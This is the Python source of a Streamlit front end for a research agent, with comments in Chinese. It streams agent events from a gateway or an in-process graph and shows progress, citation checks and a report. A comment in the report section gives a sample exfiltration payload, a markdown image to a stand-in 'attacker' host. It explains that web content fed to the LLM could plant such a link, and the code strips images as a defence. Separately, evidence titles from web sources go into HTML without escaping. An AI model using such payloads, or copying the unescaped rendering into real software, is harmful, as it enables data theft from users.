"""研知 · Deep Research Agent —— Streamlit 界面（事件契约的首个消费端）。

为什么是"后台线程 + 事件队列轮询"：Streamlit 每次交互都会重跑整个脚本，
同步跑长任务会把页面锁死——老项目踩过的坑，这里复用"后台任务 + 轮询"
模式，只是数据源从 HTTP 轮询换成了进程内事件队列（QueueSink）。

D8 起有两种数据源（UI_MODE 开关，PLAN §3.1 三端共用契约）：
  - gateway（默认）：读 FastAPI SSE 网关，UI 是纯 HTTP 客户端——
    与 Next.js 消费同一条流，这是"三端共用契约"叙事的主路径；
  - inline：进程内直调 run_research（D5 原模式，SSE 卡壳时的砍线兜底）。
两种模式喂给 UI 的都是同一个 QueueSink，live_panel 一行不用改。

视觉（D11+）：深色研究台风格，设计参照 GPT Researcher（深色 + teal 强调、
"输入 → 实时进度 → 报告"三段向导流）与 Streamlit 官方 theming 指南；
主题色在 .streamlit/config.toml，组件级样式在本文件的 _CSS。
事件消费逻辑与样式完全分离——改样式不许碰 drain 循环。

启动（项目根目录，gateway 模式先起网关）：
    /opt/anaconda3/envs/agent-research/bin/uvicorn api.main:app --port 8000
    /opt/anaconda3/envs/agent-research/bin/streamlit run frontend/app.py
"""
from __future__ import annotations

import json
import os
import queue
import re
import sys
import threading
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))  # streamlit 只加脚本目录进 sys.path

import requests  # noqa: E402
import streamlit as st  # noqa: E402

from app.config import get_settings  # noqa: E402
from app.contracts import (  # noqa: E402
    EVENT_DONE,
    EVENT_ERROR,
    EVENT_REPORT_DELTA,
    EVENT_REPORT_RESET,
    EVENT_RESEARCH_STARTED,
    AgentEvent,
)
from app.graph.build import run_research  # noqa: E402

UI_MODE = os.getenv("UI_MODE", "gateway")  # gateway | inline
GATEWAY_URL = os.getenv("GATEWAY_URL", "http://127.0.0.1:8000").rstrip("/")

# 报告渲染前剥 markdown 图片：`![alt](url)` 与 HTML img 一律屏蔽
_IMG_RE = re.compile(r"!\[[^\]]*\]\([^)]*\)")

st.set_page_config(page_title="研知 · Deep Research Agent", page_icon="🔬", layout="wide")

# 组件级样式：卡片化容器 / 渐变主按钮 / 状态胶囊 / 事件流配色。
# 只动观感；选择器绑定 Streamlit 官方 data-testid，升级 Streamlit 时只需对表。
_CSS = """
<style>
  /* 主区留白收紧，接近"应用"而不是"文档" */
  .block-container { padding-top: 1.2rem; padding-bottom: 2rem; max-width: 68rem; }

  /* 首屏横幅：渐变标题条（自包含 HTML，一次 st.markdown 渲染） */
  .hero {
    border-radius: 14px; padding: 1.1rem 1.4rem; margin-bottom: .6rem;
    background: linear-gradient(120deg, #0E7490 0%, #14B8A6 45%, #6366F1 100%);
  }
  .hero h1 { color: #F4FBFA; font-size: 1.6rem; margin: 0; font-weight: 700; }
  .hero p  { color: #E7FAF6; margin: .25rem 0 0; opacity: .92; font-size: .95rem; }

  /* 输入卡与报告卡：所有带边框容器统一卡片化 */
  [data-testid="stVerticalBlockBorderWrapper"] {
    background: rgba(19, 28, 51, .72); border: 1px solid #24304F !important;
    border-radius: 14px;
  }
  /* 输入框：深底、聚焦时 teal 描边 */
  [data-testid="stTextInputField"] {
    background: #0D1428; border: 1px solid #24304F; border-radius: 10px; color: #E6EAF2;
  }
  [data-testid="stTextInputField"]:focus {
    border-color: #14B8A6; box-shadow: 0 0 0 2px rgba(20,184,166,.25);
  }

  /* 主按钮：teal 渐变、悬浮微抬 */
  .stButton > button {
    width: 100%; border: none; border-radius: 10px; font-weight: 600;
    background: linear-gradient(90deg, #0E9F8C, #14B8A6); color: #06231F;
    transition: transform .12s ease, box-shadow .12s ease;
  }
  .stButton > button:hover:not(:disabled) {
    transform: translateY(-1px); box-shadow: 0 6px 18px rgba(20,184,166,.35);
  }
  .stButton > button:disabled { filter: grayscale(.6); opacity: .55; }

  /* 状态胶囊（自包含 HTML） */
  .pill { display: inline-block; padding: .3rem .85rem; border-radius: 999px;
          font-size: .88rem; font-weight: 600; border: 1px solid transparent; }
  .pill-run {
    background: rgba(245, 158, 11, .12); color: #FBBF24; border-color: rgba(245,158,11,.4);
  }
  .pill-ok {
    background: rgba(20, 184, 166, .14); color: #2DD4BF; border-color: rgba(20,184,166,.45);
  }
  .pill-err {
    background: rgba(239, 68, 68, .12); color: #F87171; border-color: rgba(239,68,68,.4);
  }
  .pill-idle {
    background: rgba(148, 163, 184, .1); color: #94A3B8; border-color: rgba(148,163,184,.3);
  }

  /* 证据来源徽章：kb=紫（私有库） web=蓝（公网） */
  .badge { display: inline-block; padding: .05rem .5rem; margin-right: .3rem;
           border-radius: 999px; font-size: .74rem; font-weight: 700; }
  .badge-kb  { background: rgba(139, 92, 246, .16); color: #C4B5FD; }
  .badge-web { background: rgba(59, 130, 246, .16); color: #93C5FD; }

  /* 事件流：等宽小字，类型着色 */
  .ev { font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
        font-size: .76rem; color: #9FB0CC; padding: .12rem 0; display: block; }
  .ev b { color: #5EEAD4; font-weight: 600; }
  .ev-warn b { color: #FBBF24; }
  .ev-err b  { color: #F87171; }

  /* 侧栏：更深一档 + 右缘分隔线 */
  [data-testid="stSidebar"] { background: #0A0F1D; border-right: 1px solid #1B2743; }
  [data-testid="stSidebar"] hr { margin: .4rem 0; }

  /* 报告排版：行高与段距 */
  .report-body p { line-height: 1.75; margin-bottom: .7rem; }

  /* 屏蔽官方 skills 推广 toast：容器以不可见锚条拦截整页指针事件，
     输入框/按钮全部"点了没反应"（实机抓过）。本应用不用 st.toast()。 */
  [data-testid='stToast'], [data-testid='stToastContainer'], div[class*='stToast'] {
    display: none !important;
  }
</style>
"""
st.markdown(_CSS, unsafe_allow_html=True)


class QueueSink:
    """把图的事件流推进线程安全队列，UI 端轮询消费（跨线程的事件契约）。"""

    def __init__(self) -> None:
        self.q: queue.Queue[AgentEvent] = queue.Queue()

    def emit(self, event: AgentEvent) -> None:
        self.q.put(event)


def _consume_gateway(question: str, focus: str, sink: QueueSink) -> None:
    """SSE 客户端：把网关下发的契约事件逐帧转回 AgentEvent 推进队列。

    为什么逐行解析而不是引 SSE 库：协议就一行一个 `data: {json}`，
    三十行代码换零依赖，冲刺期划算。任何传输层异常都转成 EVENT_ERROR
    入队——UI 的终止逻辑只认事件，不感知传输细节（与 inline 模式对称）。
    """
    try:
        resp = requests.post(
            f"{GATEWAY_URL}/api/research",
            json={"question": question, "focus": focus},
            stream=True,
            timeout=(3, None),  # 读超时必须放开：研究是分钟级长流
        )
        resp.raise_for_status()
        for line in resp.iter_lines(decode_unicode=True):
            if not line.startswith("data: "):
                continue
            data = json.loads(line[len("data: ") :])
            sink.emit(
                AgentEvent(
                    type=data["type"], payload=data.get("payload", {}), ts=data.get("ts", 0.0)
                )
            )
    except requests.RequestException as exc:
        sink.emit(
            AgentEvent(
                EVENT_ERROR,
                {
                    "code": "gateway_unreachable",
                    "msg": f"网关不可达（{type(exc).__name__}）：先启动 "
                    f"uvicorn api.main:app（GATEWAY_URL={GATEWAY_URL}），"
                    "或把 UI_MODE 改为 inline 直调进程内图",
                },
            )
        )


for key, default in {
    "thread": None,
    "sink": None,
    "report_text": "",
    "done": False,
    "error": None,
    "mode": "",
    "round_n": 0,
    "events": [],
    "citation": None,
}.items():
    if key not in st.session_state:
        st.session_state[key] = default

# ============ 侧栏：运行配置与快捷入口（纯展示，随交互刷新） ============
with st.sidebar:
    st.markdown("## 🔬 研知")
    st.caption("把 RAG 变成 Agent 的多跳研究台")
    st.divider()
    settings = get_settings()
    st.markdown("**运行配置**")
    st.markdown(
        f"- 取证链路：`{settings.provider_mode}`"
        f"（{'MCP 双源' if settings.provider_mode == 'mcp' else '直连/离线'}）"
    )
    st.markdown(f"- 数据源：`{UI_MODE}`（gateway=SSE 客户端）")
    st.markdown(f"- 追踪：`{'开' if settings.tracing_enabled else '关'}`")
    st.markdown(f"- 回环上限：`{settings.max_rounds}` 轮")
    st.divider()
    st.link_button("🛰️ 打开 Langfuse 追踪", "https://cloud.langfuse.com", use_container_width=True)
    st.caption("研究结束后 trace 数秒内可见：每次 LLM 调用的 prompt/耗时/用量")
    st.divider()
    st.caption("⌨️ 输入后按 **Enter** 提交文字，按钮解锁后再点「开始研究」。")

# ============ 主区：横幅 → 输入卡 → 实时面板 ============
st.markdown(
    '<div class="hero"><h1>🔬 研知 · Deep Research Agent</h1>'
    "<p>规划 → 混合检索（私有库 + 公网）→ 验证回环 → 带引用报告｜事件契约 v1 实时呈现</p></div>",
    unsafe_allow_html=True,
)

question = st.text_input(
    "研究问题",
    placeholder="例：LangGraph 和手写 Agent 循环哪个更适合生产？",
)
focus = st.text_input("关注点（可选）", placeholder="例：本地 CPU 部署；重点看混合检索")
running = st.session_state.thread is not None and st.session_state.thread.is_alive()
if st.button("▶ 开始研究", type="primary", disabled=running or not question.strip()):
    st.session_state.sink = QueueSink()
    st.session_state.report_text = ""
    st.session_state.done = False
    st.session_state.error = None
    st.session_state.mode = ""
    st.session_state.round_n = 0
    st.session_state.events = []
    st.session_state.citation = None
    # UI_MODE 决定数据源：gateway=SSE 客户端（主路径），inline=进程内直调（砍线兜底）。
    # 两个 target 的签名刻意对齐（question, focus, sink），切换零胶水
    target = _consume_gateway if UI_MODE == "gateway" else run_research
    st.session_state.thread = threading.Thread(
        target=target,
        args=(question.strip(), focus.strip(), st.session_state.sink),
        daemon=True,
    )
    st.session_state.thread.start()


def _event_line(event: AgentEvent) -> str:
    """事件流单行 HTML：类型着色 + 证据来源徽章（纯展示）。"""
    p = event.payload
    if event.type == "evidence_added":
        badge = "kb" if p.get("source_type") == "kb" else "web"
        cls = "badge-kb" if badge == "kb" else "badge-web"
        return (
            f'<span class="ev"><b>[{p.get("eid", "?")}]</b>'
            f'<span class="badge {cls}">{badge}</span>'
            f'{str(p.get("title", ""))[:46]}</span>'
        )
    color = {"warning": "ev-warn", "error": "ev-err"}.get(event.type, "")
    return f'<span class="ev {color}"><b>[{event.type}]</b> {str(event.payload)[:90]}</span>'


@st.fragment(run_every="1s")
def live_panel() -> None:
    """每秒取空事件队列：报告逐字增长，过程事件即时可见。

    所有容器必须在 fragment 【内部】创建：Streamlit 1.66 起 fragment 写
    外部容器直接抛 StreamlitInvalidLayoutContextError（实机红条）。
    数据全部存 session_state，fragment 每秒从 state 重绘，无跨域写。"""
    status_ph = st.empty()
    mode_ph = st.empty()
    report_ph = st.empty()
    side_ph = st.container()

    sink = st.session_state.sink
    if sink is None:
        status_ph.markdown('<span class="pill pill-idle">💡 输入研究问题，点「▶ 开始研究」</span>',
                           unsafe_allow_html=True)
        return
    while True:
        try:
            event = sink.q.get_nowait()
        except queue.Empty:
            break
        if event.type == EVENT_REPORT_DELTA:
            st.session_state.report_text += str(event.payload.get("text", ""))
        elif event.type == EVENT_REPORT_RESET:
            # 流式断流降级的清场信号：残文不清，降级全文就会拼在半截后面
            st.session_state.report_text = ""
            st.session_state.events.append(event)
        elif event.type == EVENT_DONE:
            st.session_state.done = True
            st.session_state.citation = event.payload.get("citation_report")
        elif event.type == EVENT_RESEARCH_STARTED:
            st.session_state.mode = str(event.payload.get("provider_mode", ""))
            st.session_state.events.append(event)
        elif event.type == "round_started":
            st.session_state.round_n = int(event.payload.get("round", 0))
            st.session_state.events.append(event)
        elif event.type == EVENT_ERROR:
            # 后台线程崩掉时这是唯一能到达 UI 的失败信号（评审 P0-3）；
            # 同时进 events 列表，让过程面板里也能看到错误现场
            st.session_state.error = str(event.payload.get("msg", "未知错误"))
            st.session_state.events.append(event)
        else:
            st.session_state.events.append(event)

    alive = st.session_state.thread is not None and st.session_state.thread.is_alive()

    # ---- 状态胶囊 + 回环进度（PLAN §3.4：MAX_ROUNDS 熔断可视化）----
    if st.session_state.error:
        status_ph.markdown(
            f'<span class="pill pill-err">❌ 研究失败：{st.session_state.error[:120]}</span>',
            unsafe_allow_html=True,
        )
    elif st.session_state.done:
        status_ph.markdown('<span class="pill pill-ok">✅ 研究完成</span>', unsafe_allow_html=True)
    elif alive:
        n_events = len(st.session_state.events)
        n_chars = len(st.session_state.report_text)
        status_ph.markdown(
            f'<span class="pill pill-run">⏳ 研究中 · 第 {st.session_state.round_n} 轮'
            f" · 事件 {n_events} 条 · 报告 {n_chars} 字</span>",
            unsafe_allow_html=True,
        )
    else:
        status_ph.markdown('<span class="pill pill-idle">💡 输入研究问题，点「▶ 开始研究」</span>',
                           unsafe_allow_html=True)
    if alive and st.session_state.round_n:
        status_ph.progress(min(st.session_state.round_n / max(get_settings().max_rounds, 1), 1.0))

    # fake 模式的证据长得跟真的一样（example.com 除外），不讲明来源，
    # 现场演示忘切配置就会拿固定台词当真数据（评审 P2-10）
    if st.session_state.mode == "fake":
        mode_ph.warning(
            "🧪 离线演示模式（PROVIDER_MODE=fake）：以下证据与报告基于固定示例数据，非真实检索"
        )
    else:
        mode_ph.empty()

    # ---- 引用对账指标卡（报告完成后呈现；unmapped=幻觉引用直接曝光）----
    if st.session_state.citation:
        c = st.session_state.citation
        m1, m2, m3, m4 = st.columns(4)
        m1.metric("引用出现", c["refs_total"])
        m2.metric("去重编号", c["refs_unique"])
        m3.metric("可映射 ✓", c["mapped"], delta=None if c["unmapped"] else "零幻觉")
        m4.metric("证据总数", c["evidence_total"])
        if c["unmapped"]:
            st.error(f"⚠️ 幻觉引用（编号不在证据册里）：{c['unmapped']}")

    # ---- 报告文档卡（流式打字机）----
    if st.session_state.report_text:
        tail = " ▌" if alive and not st.session_state.done else ""
        # 剥外链图片语法再渲染：报告由不可信网页喂出来的 LLM 生成，
        # 一张 ![](http://attacker/pixel?data=...) 就是现成的数据外泄通道（评审 P2-13）
        with report_ph.container(border=True):
            st.markdown(
                '<span class="badge badge-web">报告</span>', unsafe_allow_html=True
            )
            st.markdown(
                _IMG_RE.sub("[图片已屏蔽]", st.session_state.report_text) + tail,
                unsafe_allow_html=False,
            )

    # ---- 过程事件流（等宽着色，最近 25 条）----
    with side_ph, st.expander(
        "⚙️ 研究过程事件（实时）", expanded=alive and not st.session_state.done
    ):
        for event in st.session_state.events[-25:]:
            st.markdown(_event_line(event), unsafe_allow_html=True)


live_panel()
